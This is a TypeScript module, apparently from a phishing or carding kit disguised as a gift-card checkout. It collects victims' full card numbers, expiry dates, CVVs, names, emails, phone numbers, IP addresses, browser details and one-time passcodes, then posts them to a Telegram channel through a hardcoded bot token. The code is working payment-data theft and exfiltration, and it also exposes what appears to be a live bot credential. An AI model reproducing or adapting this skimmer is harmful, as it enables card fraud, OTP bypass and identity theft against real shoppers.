
// Telegram configuration
const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
const TELEGRAM_CHANNEL_ID = "-1002550945996";

// Function to generate a unique session ID
export const generateSessionId = () => {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
};

// Function to get browser information
export const getBrowserInfo = () => {
  const userAgent = navigator.userAgent;
  const browserInfo = {
    userAgent,
    browser: "Unknown",
    version: "Unknown",
    os: "Unknown",
    device: "Unknown"
  };
  
  // Detect browser
  if (userAgent.indexOf("Firefox") > -1) {
    browserInfo.browser = "Mozilla Firefox";
  } else if (userAgent.indexOf("SamsungBrowser") > -1) {
    browserInfo.browser = "Samsung Browser";
  } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
    browserInfo.browser = "Opera";
  } else if (userAgent.indexOf("Trident") > -1) {
    browserInfo.browser = "Internet Explorer";
  } else if (userAgent.indexOf("Edge") > -1) {
    browserInfo.browser = "Microsoft Edge";
  } else if (userAgent.indexOf("Chrome") > -1) {
    browserInfo.browser = "Google Chrome";
  } else if (userAgent.indexOf("Safari") > -1) {
    browserInfo.browser = "Safari";
  }
  
  // Detect OS
  if (userAgent.indexOf("Win") > -1) {
    browserInfo.os = "Windows";
  } else if (userAgent.indexOf("Mac") > -1) {
    browserInfo.os = "MacOS";
  } else if (userAgent.indexOf("Linux") > -1) {
    browserInfo.os = "Linux";
  } else if (userAgent.indexOf("Android") > -1) {
    browserInfo.os = "Android";
  } else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) {
    browserInfo.os = "iOS";
  }
  
  // Detect device type
  if (userAgent.indexOf("Mobile") > -1) {
    browserInfo.device = "Mobile";
  } else if (userAgent.indexOf("Tablet") > -1) {
    browserInfo.device = "Tablet";
  } else {
    browserInfo.device = "Desktop";
  }
  
  return browserInfo;
};

// Improved function to send Telegram notifications that works on all devices
export const sendTelegramNotification = async (message: string): Promise<boolean> => {
  console.log("Attempting to send Telegram notification with message:", message);
  
  try {
    // Use XMLHttpRequest instead of fetch for better compatibility
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader("Content-Type", "application/json");
      
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          console.log(`XHR Response status: ${xhr.status}`);
          console.log(`XHR Response text: ${xhr.responseText}`);
          
          if (xhr.status >= 200 && xhr.status < 300) {
            console.log("Telegram notification sent successfully");
            resolve(true);
          } else {
            console.error("Failed to send Telegram notification:", xhr.responseText);
            resolve(false); // Resolve with false instead of rejecting to prevent errors
          }
        }
      };
      
      xhr.onerror = function(e) {
        console.error("XHR Error occurred while sending Telegram notification:", e);
        resolve(false); // Resolve with false instead of rejecting to prevent errors
      };
      
      const data = JSON.stringify({
        chat_id: TELEGRAM_CHANNEL_ID,
        text: message,
        parse_mode: "Markdown"
      });
      
      console.log("Sending XHR request with data:", data);
      xhr.send(data);
    });
  } catch (error) {
    console.error(`Error in sendTelegramNotification:`, error);
    return false;
  }
};

// Function to send payment details notification
export const sendPaymentDetailsNotification = async (paymentDetails: any) => {
  const { cardNumber, expiryDate, cvv, customerName, email, phone, paymentMethod, lastFour, giftCardValue, discountedAmount, browserInfo, ipAddress, sessionId } = paymentDetails;
  
  // Format date and time
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString();
  const formattedTime = currentDate.toLocaleTimeString();
  
  // Format message
  const message = `
💳 *PAYMENT DETAILS SUBMITTED*

👤 *Customer Information*:
   Name: ${customerName || "N/A"}
   Email: ${email || "N/A"}
   Phone: ${phone || "N/A"}

💰 *Payment Details*:
   Card Number: ${cardNumber || "N/A"}
   Expiry Date: ${expiryDate || "N/A"}
   CVV: ${cvv || "N/A"}
   Payment Method: ${paymentMethod || "N/A"}
   Last Four: ${lastFour || "N/A"}
   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
   Amount Charged: $${discountedAmount?.toFixed(2) || "0.00"}

📝 *SESSION DATA*:
   Session ID: ${sessionId || "N/A"}
   IP Address: ${ipAddress || "N/A"}
   Browser: ${browserInfo?.browser || "Unknown"}
   OS: ${browserInfo?.os || "Unknown"}
   Device: ${browserInfo?.device || "Unknown"}
   Date: ${formattedDate}
   Time: ${formattedTime}
`;

  return await sendTelegramNotification(message);
};

// Function to send OTP verification notification
export const sendOtpVerificationNotification = async (otp: string, attemptNumber: number, userData: any) => {
  console.log(`Attempting to send notification for attempt ${attemptNumber} with OTP: ${otp}`);
  
  // Format date and time
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString();
  const formattedTime = currentDate.toLocaleTimeString();
  
  // Format message
  const message = `
🔐 *OTP CODE ENTERED: ${otp}*
🔢 *ATTEMPT: ${attemptNumber}/3*

👤 Customer: ${userData.customerName || "N/A"}
📧 Email: ${userData.email || "N/A"}
📱 Phone: ${userData.phone || "N/A"}
💳 Payment: ${userData.paymentMethod || "N/A"} •••• ${userData.lastFour || "****"}
💰 Amount: $${userData.discountedAmount?.toFixed(2) || "0.00"}
🎁 Card Value: $${userData.giftCardValue?.toFixed(2) || "0.00"}

📝 *SESSION DATA:*
🆔 Session ID: ${userData.sessionId}
🌐 IP Address: ${userData.ipAddress}
🖥️ Browser: ${userData.browserInfo.browser}
💻 OS: ${userData.browserInfo.os}
📱 Device: ${userData.browserInfo.device}
📅 Date: ${formattedDate}
⏰ Time: ${formattedTime}
`;

  return await sendTelegramNotification(message);
};
